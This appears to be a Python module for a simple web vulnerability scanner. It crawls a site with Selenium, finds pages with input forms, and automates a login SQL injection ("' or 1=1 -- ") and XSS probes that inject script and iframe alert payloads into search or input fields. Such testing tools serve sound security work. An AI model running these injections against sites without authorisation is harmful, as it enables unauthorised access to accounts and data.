from time import sleep
from random import uniform
from .soup_methods import find_links, find_buttons, find_inputs
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By

#Find available links
def available_links(driver,site,queue,available):
    #Get domain
    domain = site.split('.')[0]
    #Visit home
    driver.get(site)
    #While there are available links
    while len(queue) != 0 :
        #Get first link
        link = queue[0]
        #Visit first link
        driver.get(f'{site}{link}')
        sleep(uniform(1.3,1.7))
        #Get html
        page = driver.page_source
        if '404' not in page :
            #Parse html
            soup = BeautifulSoup(page,'html.parser')
            #Loop through buttons
            for ref in find_buttons(soup,queue,available):
                if ref not in queue:
                    queue.append(ref)
            #Loop through links
            for ref in find_links(soup,domain,queue,available):
                if ref not in queue:
                    queue.append(ref)
            #Add to available links and remove from queue
            available.add(queue.pop(0))
        else:
            queue.pop(0)
#Check if the link has an input form
def check_form_val(driver,available,site):
    vulnerable_links=[]
    #Loop through available links
    for link in available:
        driver.get(f'{site}{link}')
        sleep(uniform(1.5,1.8))
        #Get html
        page = driver.page_source
        #Parse html
        soup = BeautifulSoup(page,'html.parser')
        #Find all inputs
        if find_inputs(soup):
            vulnerable_links.append(link)
    #check for  login link in vulnerable_links 
    if '#/login' in  vulnerable_links:
        link2='/login'
        loginsqlinjection(site,link2,driver)
    else:
        print("login link was not found in available links")
    return vulnerable_links

def loginsqlinjection(site,link2,driver): 
    #check for sql injection
    print("Trying to enter site with sqlInjection")
    print("\n")
    driver.get(f'{site}{link2}')
     #open link in firefox browser
    sleep(3)
    soup = BeautifulSoup(driver.page_source,'html.parser')
     #search for all inputs in site
    inputs=soup.find_all('input')
    id_list=[]
    for iinput in inputs: 
        #search  inputs by tag:id 
        try:
             #append id tags for username/email and password in id_list
            id = iinput['id']
            if 'mail' in id or 'pass'  in id:
                 id_list.append(id)  
        except:
            pass
        #type in username/email field sqlinjection
    driver.find_element_by_id(id_list[0]).send_keys("' or 1=1 -- ") 
    #type in password field a random text 
    driver.find_element_by_id(id_list[1]).send_keys('222')
    #press login button
    driver.find_element_by_id(id_list[1]).send_keys(Keys.ENTER) 
    sleep(2)
    #check if sqlinjection succeeded and show proper message to user
    if 'Invalid' in driver.page_source: 
        print('login failed\n')
    else:
        print("Your page is vulnerable to sql injection\n")
    
    




def xssattack(driver,site,links):
    #Checking for
    attacks = ['<script>alert("1")</script>','<iframe src="javascript:alert(`1`)">']
    print('\nChecking for successful XSS attacks')
    flag = False
    #Loop through links
    for link in links:
        driver.get(f'{site}{link}')
        #Parse html
        soup = BeautifulSoup(driver.page_source,'html.parser')
        #Find input/inputs
        inp = soup.find('input')
        input_found = False
        try:
            #If many inputs
            if isinstance(inp,list):
                #Find the class of the first
                attribute = inp['class'][0]
            else:
                attribute = inp['class']
            #Find element
            input_form = driver.find_element_by_class_name(attribute)
            #Click it
            input_form.click()
            input_found = True
        except:
            pass

        try:
            #Check if its a list
            if isinstance(inp,list):
                #Get first input
                attribute = inp['id'][0]
            else:
                attribute = inp['id']
            #FInd element
            input_form = driver.find_element_by_id(attribute)
            input_form.click()
            input_found = True
        except:
            pass

        try:
            #Find an element containing search.Probably search input
            input_form = driver.find_elements_by_xpath("//*[contains(text(), 'search')]")
            #If its a list of inputs
            if isinstance(input_form,list):
                #Loop though inputs
                for i in input_form:
                    try:
                        #Try clicking it
                        i.click()
                        input_found = True
                        #Find id of input
                        input_id = soup.find('input')['id']
                        #Get element from id now that it is revealed
                        input_form = driver.find_element_by_id(input_id)
                        break
                    except:
                        pass
            else:
                #Click element
                input_form.click()
                input_found = True
        except:
            pass
        #If input is found
        if input_found == True:
            #Loop through attacks
            for attack in attacks:
                #If we got many inputs
                if isinstance(input_form,list):
                    #Loop through inputs
                    for i in input_form:
                        try:
                            #Send attack
                            input_form.send_keys(attack)
                            input_form.send_keys(Keys.RETURN)
                            break
                        except:
                            pass
                else:
                    #Send attack
                    input_form.send_keys(attack)
                    input_form.send_keys(Keys.RETURN)
                try:
                    #Check alert box we opened
                    alert = WebDriverWait(driver,2).until(EC.alert_is_present())
                    alert.accept()
                    #We found an xss
                    flag = True
                except:
                    pass
                #If an attack was successful, return to main
                if flag == True:
                    return True
        else:
            #If no input was discovered, go to next available link
            continue
    #Return None if nothing was found
    return None
